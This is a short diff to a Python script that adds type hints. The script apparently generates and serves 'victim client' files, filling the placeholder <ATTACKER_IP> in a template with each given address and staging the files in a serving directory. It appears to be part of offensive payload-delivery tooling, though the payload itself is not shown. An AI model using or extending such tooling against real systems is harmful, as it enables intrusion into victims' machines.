@@ -2,6 +2,7 @@ import http.server
 import os
 import shutil
 import socketserver
+from typing import List
 import utilities
 
 PORT = 8000
@@ -32,17 +33,17 @@ def main():
         print('Waiting for requests...')
         httpd.serve_forever()
 
-def create_victim_clients_for_addresses(template_filename, ipv4s):
+def create_victim_clients_for_addresses(template_filename: str, ipv4s: List[str]):
     with open(template_filename, 'r') as template_file:
         data = template_file.read()
 
     for ipv4 in ipv4s:
         address_specific_data = data.replace('<ATTACKER_IP>', ipv4)
         address_specific_filename = template_filename.replace('template.py', f'{ipv4}.py')
-        with open(address_specific_filename, 'w') as file:
-            file.write(address_specific_data)
+        with open(address_specific_filename, 'w') as address_specific_file:
+            address_specific_file.write(address_specific_data)
 
-def prepare_serving_directory(directory, transfer_folder):
+def prepare_serving_directory(directory: str, transfer_folder: str):
     os.makedirs(directory, exist_ok=True)
     shutil.copy2(VICTIM_CLIENT_FILENAME, directory)
     for filename in os.listdir(transfer_folder):
